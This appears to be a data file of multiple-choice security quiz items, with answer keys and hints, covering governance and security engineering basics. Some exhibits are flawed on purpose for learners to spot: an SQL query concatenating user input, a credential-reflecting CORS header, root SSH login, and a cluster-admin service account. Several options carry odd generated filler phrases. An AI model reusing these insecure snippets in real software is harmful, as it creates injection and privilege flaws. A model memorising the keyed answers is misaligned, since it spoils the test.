    id: 743, rank: 4, role: "grc", topic: "Regulatory Conflict Resolution", difficulty: "EXPERT",
    q: "Two regulations impose conflicting requirements on data retention. What is the BEST approach?",
    options: ["Pick the one that is cheaper to follow","Follow whichever the largest customer prefers","Seek legal advice and document the chosen approach and rationale","Ignore both until audited, until the next scheduled review takes place"],
    correct: 2, why: "Choosing the cheaper rule is the runner-up as it is pragmatic, but it may breach the stricter law without justification.",
    hint: "Legal advice."
  },
  {
    id: 744, rank: 4, role: "grc", topic: "Third Party Assurance Programme", difficulty: "EXPERT",
    q: "Which approach best scales supplier assurance?",
    options: ["Relying on supplier marketing materials, where that is practical","No assessment for any supplier, as a general rule","Annual full audits for every supplier","Risk tiering with continuous monitoring for critical suppliers"],
    correct: 3, why: "Proportionate monitoring is scalable.",
    hint: "Tier and monitor."
  },
  {
    id: 745, rank: 4, role: "grc", topic: "Metrics to Decisions", difficulty: "EXPERT",
    q: "What makes a governance metric decision-useful?",
    options: ["It has a colourful chart that makes the report look interesting to read","It is updated once a decade, and the figures never change during the year","It links to a threshold and a clear action","It is hard to understand, and few people ask any difficult questions"],
    correct: 2, why: "Metrics should trigger action.",
    hint: "Threshold and action."
  },
  {
    id: 746, rank: 4, role: "grc", topic: "Audit Committee Exhibit", difficulty: "EXPERT",
    exhibit: "Quarter  Open high  Overdue high\nQ1       22         4\nQ2       27         9\nQ3       31         15\nQ4       36         21",
    q: "What should the audit committee ask first about this findings status?",
    options: ["Why overdue high findings have grown and who owns them","Why the report has page numbers in the footer rather than at the top","Why the font in the table is small when most members prefer larger text","Why the meeting is in the afternoon when the board usually meets in the morning"],
    correct: 0, why: "Growing overdue items show weak remediation.",
    hint: "Overdue trend."
  },
  {
    id: 747, rank: 4, role: "grc", topic: "Strategic Risk Scenarios", difficulty: "EXPERT",
    q: "Why use scenario analysis for strategic cyber risk?",
    options: ["To predict exact future dates of attacks","To replace risk registers, in most cases","To avoid thinking about unlikely events","To explore plausible severe events and their impacts"],
    correct: 3, why: "Scenarios help leaders prepare for severe events.",
    hint: "Plausible severe events."
  },
  {
    id: 748, rank: 4, role: "grc", topic: "Ethics in Governance", difficulty: "EXPERT",
    q: "A manager asks to downgrade a finding rating to avoid a bad audit result. What is the right response?",
    options: ["Ask the auditor to ignore it","Keep the rating justified by evidence and escalate the pressure","Delete the finding, in the first instance","Change the rating to keep peace"],
    correct: 1, why: "Integrity requires evidence-based ratings.",
    hint: "Evidence."
  },
  {
    id: 749, rank: 4, role: "grc", topic: "Resilience Governance", difficulty: "EXPERT",
    q: "What does operational resilience governance require beyond cyber controls?",
    options: ["Avoiding any documentation, until the next scheduled review takes place","Only buying more security tools, in most cases","Relying on suppliers' promises, in the first instance","Mapping important services and testing impact tolerances"],
    correct: 3, why: "Resilience focuses on important services.",
    hint: "Important services."
  },
  {
    id: 750, rank: 4, role: "grc", topic: "Cyber Risk Transfer Limits", difficulty: "EXPERT",
    q: "Which limitation should leaders understand about cyber insurance cover?",
    options: ["Cover always pays in full for every possible incident","Exclusions and conditions may reduce or deny a claim","Cover prevents attacks from happening","Cover removes the need to report incidents"],
    correct: 1, why: "Policies contain terms that must be met and understood.",
    hint: "Read the exclusions."
  },
  {
    id: 751, rank: 0, role: "security-engineering", topic: "Parameterised Queries", difficulty: "BEGINNER",
    q: "Which coding practice best prevents SQL injection?",
    options: ["Parameterised queries that keep user input separate from SQL code","Hiding the database error messages, and building the query as before","Building queries by joining strings with the user's text as typed","Removing the word SELECT from any input the user supplies"],
    correct: 0, why: "Parameters are sent as data, so the database never treats input as part of the command.",
    hint: "Data stays data."
  },
  {
    id: 752, rank: 0, role: "security-engineering", topic: "Reviewing a Query", difficulty: "BEGINNER",
    exhibit: "query = \"SELECT * FROM users WHERE name = '\" + request.args['name'] + \"'\"\ncursor.execute(query)",
    q: "What is wrong with this code?",
    options: ["It joins user input into the SQL text, allowing injection","It is written in a language that is too old for the database driver","It uses the wrong colour for strings and and the editor cannot highlight it","It opens too many files at once, and exhausts the process resources"],
    correct: 0, why: "Concatenating untrusted input into SQL lets attackers change the query logic.",
    hint: "Look at the string join."
  },
  {
    id: 753, rank: 0, role: "security-engineering", topic: "Least Privilege", difficulty: "BEGINNER",
    q: "What does the principle of least privilege mean?",
    options: ["Allowing each team to decide its own level of access with no review","Giving every administrator access to all of the systems in the company","Giving users and services only the access they need to do their job","Removing every password from the accounts used by the support team"],
    correct: 2, why: "Limiting access reduces the damage from mistakes and compromised accounts.",
    hint: "Only what is needed."
  },
  {
    id: 754, rank: 0, role: "security-engineering", topic: "Password Storage", difficulty: "BEGINNER",
    q: "How should an application store user passwords?",
    options: ["As hashes created with a fast algorithm, and no salt added to them","As plain text and the support staff can read them when users call","As salted hashes made with a slow algorithm such as bcrypt","Encrypted with one key that every developer on the team knows and uses"],
    correct: 2, why: "Slow salted hashes make stolen password databases expensive to crack.",
    hint: "Slow and salted."
  },
  {
    id: 755, rank: 0, role: "security-engineering", topic: "TLS Purpose", difficulty: "BEGINNER",
    q: "What does TLS protect on a web connection?",
    options: ["Confidentiality and integrity of data in transit","The source code in the repository, as a general rule","The files on the server's disk, as a general rule","The backups in the cloud"],
    correct: 0, why: "TLS encrypts and authenticates traffic between client and server.",
    hint: "In transit."
  },
  {
    id: 756, rank: 0, role: "security-engineering", topic: "Patch Management Basics", difficulty: "BEGINNER",
    q: "Why should security patches be applied promptly?",
    options: ["They make the screen look different after the installation has finished","Attackers quickly use published flaws against unpatched systems","They are needed only once a year to satisfy the licence terms of the vendor","They delete old user accounts that are no longer being used by anyone"],
    correct: 1, why: "Exploits for known flaws often appear within days of disclosure.",
    hint: "Known flaws get exploited."
  },
  {
    id: 757, rank: 0, role: "security-engineering", topic: "Secrets in Source Code", difficulty: "BEGINNER",
    q: "A developer finds an API key committed to a public repository. What is the BEST first action?",
    options: ["Make the repository private, and keep the key","Delete the file from the latest commit and carry on, and revisit the decision after the next release","Tell the team to avoid using that repository, and review the outcome at the next monthly meeting","Revoke and rotate the key, then remove it and review the access logs, wherever possible"],
    correct: 3, why: "Deleting the file is the runner-up since it removes the key from view, but it remains in history and may already be copied, so rotate first.",
    hint: "Rotate first."
  },
  {
    id: 758, rank: 0, role: "security-engineering", topic: "Hardening Meaning", difficulty: "BEGINNER",
    q: "What does hardening a server involve?",
    options: ["Adding more memory and it runs faster during busy periods, as a general rule","Installing every available application for staff convenience","Removing unneeded services and applying secure configuration settings","Painting the cabinet that holds it in the machine room, until the next scheduled review takes place"],
    correct: 2, why: "Reducing the attack surface and tightening settings makes compromise harder.",
    hint: "Reduce attack surface."
  },
  {
    id: 759, rank: 0, role: "security-engineering", topic: "Multi-Factor Authentication", difficulty: "BEGINNER",
    q: "Which combination is an example of multi-factor authentication?",
    options: ["A username and a password","A password, and a security question","A password plus a code from an authenticator app","Two different passwords typed one after the other"],
    correct: 2, why: "MFA combines different factor types: something known, held or being.",
    hint: "Different factor types."
  },
  {
    id: 760, rank: 0, role: "security-engineering", topic: "Firewall Default Policy", difficulty: "BEGINNER",
    q: "What is the safest default stance for a firewall's inbound rules?",
    options: ["Allow all, and block known bad traffic only","Allow traffic from the internal network without any checks","Allow everything until someone complains","Deny all and allow only the traffic that is needed"],
    correct: 3, why: "Default deny limits exposure to the services that are intentionally permitted.",
    hint: "Deny by default."
  },
  {
    id: 761, rank: 0, role: "security-engineering", topic: "Reading a Firewall Rule", difficulty: "BEGINNER",
    exhibit: "1 ALLOW any -> web-srv tcp/443\n2 ALLOW any -> db-srv tcp/3306\n3 DENY  any -> any tcp/23\n4 ALLOW lan -> dns-srv udp/53",
    q: "Which rule is the riskiest in this extract?",
    options: ["Rule 3, which blocks telnet","Rule 1, which allows the web port from the internet, in most cases","Rule 4, which allows DNS to the resolver, as a general rule","Rule 2, which allows any source to reach the database port"],
    correct: 3, why: "A database should not be reachable from any source on the internet.",
    hint: "Check the destination port."
  },
  {
    id: 762, rank: 0, role: "security-engineering", topic: "Input Validation", difficulty: "BEGINNER",
    q: "Why should input be validated on the server side as well as in the browser?",
    options: ["Attackers can bypass browser checks by sending requests directly","Validation in the browser is forbidden by the standards that browsers follow","Browsers cannot display web forms unless the server has validated them first","Servers have more memory than browsers, and can store the extra rules"],
    correct: 0, why: "Client-side checks help users but are not a security control.",
    hint: "Never trust the client."
  },
  {
    id: 763, rank: 0, role: "security-engineering", topic: "Error Message Exposure", difficulty: "BEGINNER",
    q: "Why should production error pages avoid showing stack traces?",
    options: ["They make every page load more slowly for each visitor to the site","They are required to be hidden by the browser vendors in every release","They use more colours than necessary, and confuse the visitors using the site","They can reveal internal details that help an attacker"],
    correct: 3, why: "Verbose errors disclose paths, versions and queries.",
    hint: "Do not leak internals."
  },
  {
    id: 764, rank: 0, role: "security-engineering", topic: "Session Cookie Settings", difficulty: "BEGINNER",
    q: "Which cookie attributes best protect a session cookie?",
    options: ["Secure, HttpOnly and SameSite","Visible, Shared and Permanent","Public, Open and Unlimited, in most cases","Large, Colourful and Fast, in most cases"],
    correct: 0, why: "These attributes reduce interception, script access and cross-site use.",
    hint: "Secure and HttpOnly."
  },
  {
    id: 765, rank: 0, role: "security-engineering", topic: "Logging Essentials", difficulty: "BEGINNER",
    q: "Which event is most important to log for security monitoring?",
    options: ["The names of the files on the desktop, in most cases","The colour theme chosen by each user, as a general rule","Failed and successful sign-ins to important systems","The font used in documents"],
    correct: 2, why: "Authentication events show attacks and misuse.",
    hint: "Who signed in."
  },
  {
    id: 766, rank: 0, role: "security-engineering", topic: "Dependency Updates", difficulty: "BEGINNER",
    q: "A web application uses a library with a published critical vulnerability. What is the BEST action?",
    options: ["Remove the library name from the documentation, and revisit the decision after the next release","Update to the fixed version, and test the application, in the first instance","Wait to see whether anyone attacks it","Disable the logs"],
    correct: 1, why: "Waiting is the runner-up as updates can break things, but a published critical flaw will be targeted, so update and test.",
    hint: "Update and test."
  },
  {
    id: 767, rank: 0, role: "security-engineering", topic: "Code Review Value", difficulty: "BEGINNER",
    q: "Why do teams perform peer code review?",
    options: ["To catch defects and security flaws before release","To reduce the number of developers that the company needs to employ","To avoid the need for any testing of the software before it goes live","To increase the number of lines of code that the team produces each week"],
    correct: 0, why: "A second pair of eyes finds issues the author missed.",
    hint: "Second pair of eyes."
  },
  {
    id: 768, rank: 0, role: "security-engineering", topic: "Network Segmentation", difficulty: "BEGINNER",
    q: "What is the main security benefit of segmenting a network?",
    options: ["It prevents all phishing emails from reaching the staff in the company","It limits how far an attacker can move after a compromise","It makes the network faster in every case, whatever traffic is carried","It removes the need for passwords on the systems inside each segment"],
    correct: 1, why: "Segments contain breaches and restrict unnecessary access.",
    hint: "Contain movement."
  },
  {
    id: 769, rank: 0, role: "security-engineering", topic: "Backup Principle", difficulty: "BEGINNER",
    q: "Which backup practice best protects against ransomware?",
    options: ["Keeping offline or immutable copies and testing restores","Backing up once a year, until the next scheduled review takes place","Keeping one copy on the same server","Keeping backups on a mapped network drive, until the next scheduled review takes place"],
    correct: 0, why: "Attackers encrypt reachable backups, so isolated copies and tested recovery are essential.",
    hint: "Offline and tested."
  },
  {
    id: 770, rank: 0, role: "security-engineering", topic: "Email Authentication", difficulty: "BEGINNER",
    exhibit: "example.com TXT \"v=spf1 include:_spf.mail.example ~all\"\n_dmarc.example.com TXT \"v=DMARC1; p=none; rua=mailto:dmarc@example.com\"",
    q: "Which records help receivers check that email really came from your domain?",
    options: ["TXT and CNAME for web pages","MX, NS and SOA","SPF, DKIM and DMARC","A, AAAA and PTR"],
    correct: 2, why: "Together they authenticate senders and tell receivers what to do with failures.",
    hint: "Three letters, one policy."
  },
  {
    id: 771, rank: 0, role: "security-engineering", topic: "Default Accounts", difficulty: "BEGINNER",
    q: "What should be done with default administrator accounts on new devices?",
    options: ["Leave them as supplied","Change or disable the default credentials before use","Write them on the device, then record the result in the ticket","Share them with the team"],
    correct: 1, why: "Defaults are published and tried first by attackers.",
    hint: "Change defaults."
  },
  {
    id: 772, rank: 0, role: "security-engineering", topic: "Antivirus and EDR", difficulty: "BEGINNER",
    q: "What advantage does endpoint detection and response have over basic antivirus?",
    options: ["It replaces all patching, and the updates are no longer needed at all","It makes the computer run faster by removing unused programs during the night","It only scans the incoming emails for attachments that contain known viruses","It records behaviour and helps investigate and respond"],
    correct: 3, why: "EDR gives visibility into process activity and allows containment.",
    hint: "Behaviour and response."
  },
  {
    id: 773, rank: 0, role: "security-engineering", topic: "VPN Purpose", difficulty: "BEGINNER",
    q: "What does a VPN provide for remote workers?",
    options: ["Free software licences for the applications used by the remote workers","An encrypted tunnel to the company network, as a general rule","A faster home internet connection when the staff are working from home","A larger display for the remote workers who use a small laptop screen"],
    correct: 1, why: "VPNs protect traffic over untrusted networks and control access.",
    hint: "Encrypted tunnel."
  },
  {
    id: 774, rank: 0, role: "security-engineering", topic: "DMZ Concept", difficulty: "BEGINNER",
    q: "What is a DMZ in network design?",
    options: ["A separate zone for public-facing servers, in most cases","A shared folder that holds the old files that are no longer needed","A backup site that is located in another city to protect against disasters","A zone in which nobody is allowed to log in under any circumstances"],
    correct: 0, why: "A DMZ limits exposure of internal systems if a public server is compromised.",
    hint: "Between the two."
  },
  {
    id: 775, rank: 0, role: "security-engineering", topic: "Secure Deletion", difficulty: "BEGINNER",
    q: "Why is simply deleting a file not enough before disposing of a disk?",
    options: ["Data may remain recoverable, so wipe or destroy the disk","The deleted file will reappear on another computer in the network automatically","Deleting a file makes the disk heavier, and slower when it is returned","Deleting files from disks that are being disposed of is not allowed by law"],
    correct: 0, why: "Standard deletion removes pointers, not the data itself.",
    hint: "Wipe or destroy."
  },
  {
    id: 776, rank: 0, role: "security-engineering", topic: "Certificate Expiry", difficulty: "BEGINNER",
    q: "What is a typical result of an expired TLS certificate?",
    options: ["All of the user passwords are reset when the certificate passes its end date","The server becomes faster as it no longer checks the certificate chain","The whole network is disconnected until the supplier has renewed the licence","Browsers show warnings and some clients refuse to connect, in most cases"],
    correct: 3, why: "Expired certificates break trust and often cause outages.",
    hint: "Warnings and failures."
  },
  {
    id: 777, rank: 0, role: "security-engineering", topic: "Rate Limiting", difficulty: "BEGINNER",
    q: "What does rate limiting on a login endpoint help prevent?",
    options: ["The upload of large images by users who edit their profile pictures","Slow page loading when the site is busy during the lunch hour","The delivery of email messages from the application to the customers","Rapid automated password guessing"],
    correct: 3, why: "Limits on attempts slow brute force and credential stuffing.",
    hint: "Slow the guessing."
  },
  {
    id: 778, rank: 0, role: "security-engineering", topic: "Single Sign-On Benefit", difficulty: "BEGINNER",
    q: "Which is a security benefit of single sign-on?",
    options: ["It removes the need for logging","Central control of authentication and access removal","Everyone shares one password","Passwords are never needed"],
    correct: 1, why: "SSO simplifies enforcement of MFA and offboarding.",
    hint: "Central control."
  },
  {
    id: 779, rank: 0, role: "security-engineering", topic: "Container Basics", difficulty: "BEGINNER",
    q: "What is a sensible security practice for container images?",
    options: ["Run all containers as root, until the next scheduled review takes place","Use minimal trusted base images and scan them for vulnerabilities","Store secrets in the image","Download images from any public source without checks, in most cases"],
    correct: 1, why: "Smaller trusted images reduce the attack surface and known flaws.",
    hint: "Minimal and scanned."
  },
  {
    id: 780, rank: 0, role: "security-engineering", topic: "Clock Accuracy on Servers", difficulty: "BEGINNER",
    q: "Why is accurate time important on servers?",
    options: ["It saves storage","It stops viruses","It makes screens brighter","Logs and certificates depend on correct time, in most cases"],
    correct: 3, why: "Event correlation and token validity rely on synchronised clocks.",
    hint: "Logs and tokens."
  },
  {
    id: 781, rank: 0, role: "security-engineering", topic: "Change Control Value", difficulty: "BEGINNER",
    q: "Why use change control for production systems?",
    options: ["To avoid testing","To make changes slower for no reason","To review and record changes so that problems can be traced, and reversed","To hide changes"],
    correct: 2, why: "Controlled change reduces outages and unauthorised modifications.",
    hint: "Review and trace."
  },
  {
    id: 782, rank: 0, role: "security-engineering", topic: "CSRF Concept", difficulty: "BEGINNER",
    q: "What does a cross-site request forgery attack do?",
    options: ["Changes the DNS","Floods the network","Makes a victim's browser send an unwanted request to a site where they are logged in","Steals the server's disk"],
    correct: 2, why: "The browser attaches the victim's cookies to a request the attacker triggers.",
    hint: "Browser sends it."
  },
  {
    id: 783, rank: 0, role: "security-engineering", topic: "Physical Security Link", difficulty: "BEGINNER",
    q: "Why does physical security matter to system security?",
    options: ["It has no effect on computers","Someone with physical access can bypass many technical controls","It replaces firewalls","It only matters for paper"],
    correct: 1, why: "Locked rooms and controlled access protect devices and ports.",
    hint: "Physical access bypasses controls."
  },
  {
    id: 784, rank: 0, role: "security-engineering", topic: "Vulnerability Scanning", difficulty: "BEGINNER",
    q: "What does a vulnerability scanner do?",
    options: ["Blocks all attacks automatically","Writes code","Checks systems for known weaknesses and missing patches","Repairs hardware"],
    correct: 2, why: "Scanners identify issues so they can be prioritised and fixed.",
    hint: "Finds known flaws."
  },
  {
    id: 785, rank: 0, role: "security-engineering", topic: "Encryption at Rest", difficulty: "BEGINNER",
    q: "What does encryption at rest protect against?",
    options: ["Slow websites","Phishing emails","Exposure of data if storage media is stolen or accessed without authorisation","Network eavesdropping"],
    correct: 2, why: "Stored data stays unreadable without the key.",
    hint: "Stored data."
  },
  {
    id: 786, rank: 0, role: "security-engineering", topic: "Software Inventory", difficulty: "BEGINNER",
    q: "Why should an organisation keep an inventory of software and versions?",
    options: ["To count staff","To know what needs patching when vulnerabilities are announced","To pick desk colours","To avoid licences"],
    correct: 1, why: "You cannot fix what you cannot find.",
    hint: "Know what you run."
  },
  {
    id: 787, rank: 0, role: "security-engineering", topic: "Allowlisting Idea", difficulty: "BEGINNER",
    q: "What is application allowlisting?",
    options: ["Allowing all downloads","Blocking only known viruses","Permitting only approved programs to run, as a general rule","Listing staff names"],
    correct: 2, why: "Allowlisting blocks unknown or unapproved software by default.",
    hint: "Approved only."
  },
  {
    id: 788, rank: 0, role: "security-engineering", topic: "Web Application Firewall", difficulty: "BEGINNER",
    q: "A company wants quick protection for a vulnerable legacy website while developers prepare a fix. What is the BEST short-term control?",
    options: ["Place a web application firewall in front with rules for the known flaw, as soon as practical","Rename the site","Turn off logging","Ignore it until the fix is ready"],
    correct: 0, why: "Ignoring it is the runner-up as the fix is coming, but the site stays exposed; a WAF gives temporary protection.",
    hint: "Virtual patch."
  },
  {
    id: 789, rank: 0, role: "security-engineering", topic: "Secure Defaults", difficulty: "BEGINNER",
    q: "What does 'secure by default' mean for a product?",
    options: ["Users must turn on all security manually","The default settings are the safest practical configuration","Security is optional","Only experts can use it"],
    correct: 1, why: "Safe defaults protect users who never change settings.",
    hint: "Safe out of the box."
  },
  {
    id: 790, rank: 0, role: "security-engineering", topic: "Principle of Defence in Depth", difficulty: "BEGINNER",
    q: "What does defence in depth mean?",
    options: ["Buying all security products from a single supplier","Hiding the systems, and nobody can find them","Relying on one very strong firewall at the edge of the network, as soon as practical","Using several layers of controls so one failure does not expose everything"],
    correct: 3, why: "Layered controls give several chances to stop or detect an attack.",
    hint: "Many layers."
  },
  {
    id: 791, rank: 0, role: "security-engineering", topic: "Firewall Rule Exhibit", difficulty: "BEGINNER",
    exhibit: "Rule 14  ALLOW  src=ANY  dst=10.0.5.20  port=ANY  proto=ANY  log=no\nRule 15  ALLOW  src=10.0.4.0/24  dst=10.0.5.20  port=5432  proto=TCP  log=yes\nRule 99  DENY   src=ANY  dst=ANY  port=ANY",
    q: "What is wrong with this firewall rule?",
    options: ["It blocks all traffic from the internet by default","It logs the traffic that it denies","It allows any source to reach the internal server on every port","It allows only the web server to reach the database"],
    correct: 2, why: "An any-to-any allow removes the protection the firewall is meant to give.",
    hint: "Read the source and ports."
  },
  {
    id: 792, rank: 0, role: "security-engineering", topic: "Secure Configuration Baseline", difficulty: "BEGINNER",
    q: "What is the purpose of a secure configuration baseline?",
    options: ["To list the users who may take equipment home","To record the price of each device in the company, as a general rule","To describe the colours of the office network cables","To define the approved hardened settings for a system type"],
    correct: 3, why: "Baselines make hardening consistent and auditable.",
    hint: "Approved settings."
  },
  {
    id: 793, rank: 0, role: "security-engineering", topic: "Least Privilege Example", difficulty: "BEGINNER",
    q: "Which choice follows least privilege for a new accountant?",
    options: ["Access to the finance system only for their role","Access to every shared folder for convenience, as a general rule","Administrator rights on all company servers, in most cases","The same account as the finance manager"],
    correct: 0, why: "Users should have only the access that they need.",
    hint: "Only what is needed."
  },
  {
    id: 794, rank: 0, role: "security-engineering", topic: "Secure Remote Access", difficulty: "BEGINNER",
    q: "Which is the safest way to give staff access to internal systems from home?",
    options: ["Sending the data to personal email accounts","Sharing one remote access password with the whole team, as soon as practical","Opening the internal systems directly to the internet, as soon as practical","A VPN or secure access service with multi-factor authentication"],
    correct: 3, why: "Protected and authenticated access reduces exposure.",
    hint: "Protected path."
  },
  {
    id: 795, rank: 0, role: "security-engineering", topic: "Vulnerability Scan Result Exhibit", difficulty: "BEGINNER",
    exhibit: "Host            Exposure   Severity  Finding\nweb-gw-01       Internet   Critical  Remote code execution in framework 2.3\nprinter-12      Internal   Low       Banner discloses firmware version\nlab-08          Lab        Info      Port 8080 open\ntest-site       Test       Low       Certificate name mismatch",
    q: "Which scan finding should be fixed first?",
    options: ["Cosmetic warning about a certificate name on a test site, in most cases","Informational note about an open port on a lab host, as a general rule","Low severity banner disclosure on an internal printer","Critical remote code execution flaw on an internet-facing server"],
    correct: 3, why: "Exposure and severity set priority.",
    hint: "Exposure and severity."
  },
  {
    id: 796, rank: 0, role: "security-engineering", topic: "Removable Media Control", difficulty: "BEGINNER",
    q: "Which control best reduces the risk of malware from USB drives?",
    options: ["Allow any device to connect to the network, and revisit the decision after the next release","Block or scan removable media with endpoint controls, in the first instance","Disable the antivirus on affected computers","Ask staff to avoid using any computers"],
    correct: 1, why: "Technical controls reduce reliance on user behaviour.",
    hint: "Control the port."
  },
  {
    id: 797, rank: 0, role: "security-engineering", topic: "Strong Authentication Basics", difficulty: "BEGINNER",
    q: "Which pair of factors counts as multi-factor authentication?",
    options: ["A password and a code from an authenticator app","A username and an email address, as a general rule","A password and a second password","Two security questions"],
    correct: 0, why: "Multi-factor combines different kinds of evidence.",
    hint: "Different factors."
  },
  {
    id: 798, rank: 0, role: "security-engineering", topic: "Disabling Unused Services", difficulty: "BEGINNER",
    q: "Why should unnecessary services be disabled on a server?",
    options: ["Services make the server heavier to carry","Each running service is a possible way in for an attacker","Services stop the server from being backed up, as a general rule","Services reduce the amount of memory free forever"],
    correct: 1, why: "Fewer services means a smaller attack surface.",
    hint: "Smaller surface."
  },
  {
    id: 799, rank: 0, role: "security-engineering", topic: "Software Update Exhibit", difficulty: "BEGINNER",
    exhibit: "Device        Type     Days since update  Critical missing\nsrv-web-03    Server   240                9\nlt-0415       Laptop   1                  0\nprn-02        Printer  7                  0\nph-0987       Phone    30                 0",
    q: "Which device in this update report most needs attention?",
    options: ["A server that is 240 days behind on critical updates","A phone that updated last month","A printer that updated last week","A laptop that updated yesterday"],
    correct: 0, why: "Long-unpatched systems carry known weaknesses.",
    hint: "Days behind."
  },
  {
    id: 800, rank: 0, role: "security-engineering", topic: "Account Lockout Purpose", difficulty: "BEGINNER",
    q: "What is the purpose of an account lockout after repeated failed logins?",
    options: ["To block all staff for an hour","To delete the account after a typing error","To make passwords expire faster","To slow down password guessing attacks"],
    correct: 3, why: "Lockout limits the number of guesses allowed.",
    hint: "Slow guessing."
  },
  {
    id: 801, rank: 1, role: "security-engineering", topic: "Reading Security Headers", difficulty: "INTERMEDIATE",
    exhibit: "HTTP/1.1 200 OK\nContent-Type: text/html\nStrict-Transport-Security: max-age=31536000\nX-Content-Type-Options: nosniff\nSet-Cookie: sid=abc; Secure; HttpOnly",
    q: "Which missing response header in this output leaves the page most exposed to injected scripts?",
    options: ["Date, which tells the client the time at which the response was created","Content-Length, which tells the client how many bytes the body contains","Server timing, which exposes how long each backend step took to run","Content-Security-Policy, in most cases"],
    correct: 3, why: "A content security policy restricts where scripts may load from and limits the impact of XSS.",
    hint: "The header that limits scripts."
  },
  {
    id: 802, rank: 1, role: "security-engineering", topic: "OAuth Flow Choice", difficulty: "INTERMEDIATE",
    q: "A single-page application needs to sign users in with an identity provider. What is the BEST OAuth flow?",
    options: ["Client credentials flow using one shared secret in the page","Authorization code flow with PKCE","Resource owner password flow with the user's password in the app","Implicit flow that returns the token in the browser address"],
    correct: 1, why: "The implicit flow is the runner-up since older guides recommended it, but tokens in URLs leak; code with PKCE is the current recommendation.",
    hint: "Code plus PKCE."
  },
  {
    id: 803, rank: 1, role: "security-engineering", topic: "CORS Misconfiguration", difficulty: "INTERMEDIATE",
    exhibit: "Access-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true",
    q: "Which CORS response is most dangerous for an API that uses cookies?",
    options: ["Allow-Origin reflecting any origin, with credentials allowed","Allow-Origin set to one trusted partner site that the company controls, and monitors","A Max-Age of 600 seconds, and browsers cache the preflight result briefly","No CORS headers at all, and browsers apply the default same-origin policy"],
    correct: 0, why: "Reflecting arbitrary origins with credentials lets any site read authenticated responses.",
    hint: "Reflect plus credentials."
  },
  {
    id: 804, rank: 1, role: "security-engineering", topic: "SAST Versus DAST", difficulty: "INTERMEDIATE",
    q: "How does static analysis (SAST) differ from dynamic testing (DAST)?",
    options: ["SAST reads code without running it, DAST tests the running app","SAST tests networks for open ports, while DAST tests the strength of passwords","They are identical in method and results, and differ only in the vendor name","SAST needs a running server to work, while DAST reads the source code only"],
    correct: 0, why: "SAST finds code issues early; DAST finds runtime and configuration issues from the outside.",
    hint: "Code versus running app."
  },
  {
    id: 805, rank: 1, role: "security-engineering", topic: "Branch Protection", difficulty: "INTERMEDIATE",
    q: "Which repository setting best reduces the risk of unreviewed code reaching production?",
    options: ["Allowing every developer to push directly to main, until the next scheduled review takes place","Disabling the build server","Storing the keys in the repository","Branch protection requiring reviews and passing checks before merge"],
    correct: 3, why: "Required reviews and checks enforce the process technically.",
    hint: "Enforce the review."
  },
  {
    id: 806, rank: 1, role: "security-engineering", topic: "Secrets Scanning in CI", difficulty: "INTERMEDIATE",
    q: "A pipeline should stop leaked credentials reaching the repository. What is the BEST control?",
    options: ["Pre-commit and pipeline scanning that blocks, with rotation of findings","A wiki page that lists the rules about secrets, and who to ask for help","A scan of the whole repository carried out once a year before the audit","A monthly email asking every developer to check their own code for secrets"],
    correct: 0, why: "A reminder email is the runner-up since it raises awareness, but only automated blocking stops the mistake.",
    hint: "Automate and block."
  },
  {
    id: 807, rank: 1, role: "security-engineering", topic: "Reading sshd_config", difficulty: "INTERMEDIATE",
    exhibit: "Port 22\nPermitRootLogin yes\nPasswordAuthentication no\nX11Forwarding no\nUsePAM yes",
    q: "Which setting in this sshd configuration is the biggest hardening problem?",
    options: ["X11Forwarding no, in most cases","Port 22, in most cases","PermitRootLogin yes","UsePAM yes"],
    correct: 2, why: "Direct root login over SSH removes accountability and exposes the most powerful account to guessing.",
    hint: "Root over SSH."
  },
  {
    id: 808, rank: 1, role: "security-engineering", topic: "Kubernetes RBAC", difficulty: "INTERMEDIATE",
    exhibit: "kind: ClusterRoleBinding\nsubjects:\n- kind: ServiceAccount\n  name: web-app\n  namespace: prod\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin",
    q: "A pod uses a service account bound to cluster-admin. What is the finding?",
    options: ["A normal default that needs no change as the platform team set it up","A storage limit that stops the pod from writing more than a few gigabytes","Excessive privilege that lets a compromised pod control the cluster","A performance setting that lets the scheduler place pods on busy nodes"],
    correct: 2, why: "Pods should have narrowly scoped roles; cluster-admin turns any compromise into full control.",
    hint: "Over-privileged."
  },
  {
    id: 809, rank: 1, role: "security-engineering", topic: "Infrastructure as Code Scanning", difficulty: "INTERMEDIATE",
    q: "What is the main benefit of scanning Terraform templates before deployment?",
    options: ["Misconfigurations such as public storage are caught before production","Fewer cloud accounts are needed","The scanner replaces peer review, and no human needs to read the changes","The templates run faster"],
    correct: 0, why: "Shift-left checks prevent insecure resources from being created.",
    hint: "Before deployment."
  },
  {
    id: 810, rank: 1, role: "security-engineering", topic: "Threat Modelling STRIDE", difficulty: "INTERMEDIATE",
    q: "In STRIDE, which category covers an attacker pretending to be another user?",
    options: ["Spoofing, as a general rule","Tampering","Repudiation","Elevation of privilege, in most cases"],
    correct: 0, why: "Spoofing is falsely claiming an identity; the matching control is authentication.",
    hint: "S is for spoofing."
  },
  {
    id: 811, rank: 1, role: "security-engineering", topic: "Vulnerability Prioritisation", difficulty: "INTERMEDIATE",
    q: "Scanners report 3,000 findings. What is the BEST way to prioritise remediation?",
    options: ["Fix only the ones that are easiest","Combine exploitability, exposure and asset criticality, such as with KEV","Fix only those with the highest CVSS score, and ignore everything below it","Fix them in the order the scanner lists them"],
    correct: 1, why: "Using CVSS alone is the runner-up since it is standard, but it ignores exploitation and exposure.",
    hint: "Risk, not score alone."
  },
  {
    id: 812, rank: 1, role: "security-engineering", topic: "Key Rotation", difficulty: "INTERMEDIATE",
    q: "Why should encryption keys and API secrets be rotated regularly?",
    options: ["It makes the key longer each time it is replaced by the key management service","It speeds up encryption as newer keys use more efficient processor instructions","It limits the time a stolen key remains useful","It is needed for backups only and has no effect on any other system"],
    correct: 2, why: "Rotation shortens exposure and tests the ability to replace keys.",
    hint: "Limit exposure time."
  },
  {
    id: 813, rank: 1, role: "security-engineering", topic: "Mutual TLS", difficulty: "INTERMEDIATE",
    q: "What does mutual TLS add to a normal TLS connection between services?",
    options: ["A second password that the service must send after the handshake completes","Compression of the data that is sent between the two services on the network","A faster handshake that skips the checking of the server certificate chain","The client also presents a certificate so both sides authenticate"],
    correct: 3, why: "Both parties prove identity with certificates, which suits service-to-service traffic.",
    hint: "Both authenticate."
  },
  {
    id: 814, rank: 1, role: "security-engineering", topic: "Docker Hardening", difficulty: "INTERMEDIATE",
